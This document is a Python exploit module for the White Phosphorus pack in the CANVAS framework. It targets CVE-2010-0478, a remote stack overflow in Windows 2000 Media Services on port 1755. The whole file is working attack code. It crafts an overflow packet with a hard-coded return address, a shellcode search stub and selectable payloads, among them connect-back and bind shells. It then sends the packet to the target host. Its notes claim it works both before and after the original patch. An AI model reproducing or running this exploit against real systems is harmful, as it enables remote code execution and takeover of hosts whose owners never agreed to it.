
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time
from struct import *

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


######################################################################################
NAME = "Microsoft Windows 2000 Media Services MMS Remote Overflow"
DESCRIPTION = "Exploits a stack overflow in Windows 2000 Media Services through a Transport Info packet"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION["Date public"] = "2010-04-13"
DOCUMENTATION["Repeatability"] = "One Shot"
DOCUMENTATION["References"] = "http://www.microsoft.com/technet/security/Bulletin/MS10-025.mspx"
DOCUMENTATION['CVE'] = "CVE-2010-0478"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0478'
DOCUMENTATION['CVSS'] = '9.3'
DOCUMENTATION["Notes"] = """
This exploit works PRE and POST the original patch. The patch was then re-released 2010-04-27.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000"]
PROPERTY['MSADV'] = 'MS10-025'

NOTES="""
"""

PORT = 1755
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows 2000", (0x00000000, 0x00000000, 0x0000), [WIN2K]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s############################################################
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Bind MOSDEF Shell",
              "Execute Command",
              "Socket Reuse"]

    DEFAULT_PAYLOAD = 6

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x09\x0a\x0d\x20"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        self.log("WP> Testing Media Services available..")
        ret = 0
        request_packet1 = self.makerequest()
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))

            s.sendall(request_packet1)
            
            recv_str = s.recv(4096)
            
            if ((recv_str.find("MMS")) > 0):
                self.log("WP> Test reported valid response - Service available")
                ret = 1
            else:
                self.log("WP> Test reported invalid response - Service not available")
        except:
            self.log("WP> Test reported no socket open - Service not available")
        return ret

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        # Selected shell options
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
    
    def makerequest(self):
        # MMS Connect Info Packet
        import binascii
        packet = binascii.unhexlify("01000000cefa0bb0a00000004d4d5320140000000000000000000000000000001200000001000300f0f0f0f00b0004001c0003004e00530050006c0061007900650072002f0039002e0030002e0030002e0033003200350030003b0020007b00330033003000300041004400350030002d0032004300330039002d0034003600630030002d0041004500300041002d003800420031004400390041004200440037003500450036007d00000000000000")
        return packet        
        
    def makesploit(self):
        # Transport Info packet
        searchcode = wp_SearchCode(False,"mov %esi,%edx")
               
        payload_pt3 = "\x02\x00\x03\x00\x01\xf9\xf0\xf0\xff\xff\xff\xff"
        payload_pt3 += "\x00\x00\x00\x00\x00\x00\xa0\x00\x02\x00\x00\x00\x5c\x00\x5c\x00"
        payload_pt3 += "\x31\x00\x39\x00\x32\x00\x2e\x00\x31\x00\x36\x00\x38\x00\x2e\x00"
        payload_pt3 += "\x31\x00\x2e\x00\x32\x00\x34\x00\x37\x00\x5c\x00"
        payload_pt3 += wp_randomstring(72)
        payload_pt3 += pack('<L', 0x750231E2) # PUSH ESP, RETN 0C
        payload_pt3 += wp_randomstring(20)
        payload_pt3 += wp_randomnops(12,self.badstring)
        payload_pt3 += searchcode   # our search stub

        payload_pt3 += wp_randomstring(16)
        payload_pt3 += 'c00kc00k'+self.shellcode
        
        payload_pt3 += "\x5c\x00\x31\x00\x32\x00\x37\x00\x38\x00\x00\x00\x30\x00"
        payload_pt2 = pack('<L', len(payload_pt3)/8)
        payload_pt2 += payload_pt3
        payload_pt1 = pack('<L', len(payload_pt2) / 8) 
        payload_pt1 += "\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        payload_pt1 += payload_pt2
        payload = "\x01\x00\x00\x00\xce\xfa\x0b\xb0"
        payload += pack('<L', len(payload_pt1))
        payload += "\x4d\x4d\x53\x20"
        payload += payload_pt1

        return payload        

    def run(self):
        self.getArgs()
        
        request_packet1 = self.makerequest()
        payload = self.makesploit()
        
        self.result_error = 0
        
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))
            
            self.log("WP> Sending Initial Packet")
            s.sendall(request_packet1)
            recv_str = s.recv(4096)
            
            self.log("WP> Sending Exploit")
            s.sendall(payload)
            
            time.sleep(4)

            if getattr(self, 'shell_REUSESOCKET',False) == False:
                s.close()

        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0        

        time.sleep(3)
        
        # Check if follow up is required for some shellcodes
        if self.result_error==0:
            ret = self.wp_postExploitShellcode(s)
            if ret:
                return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
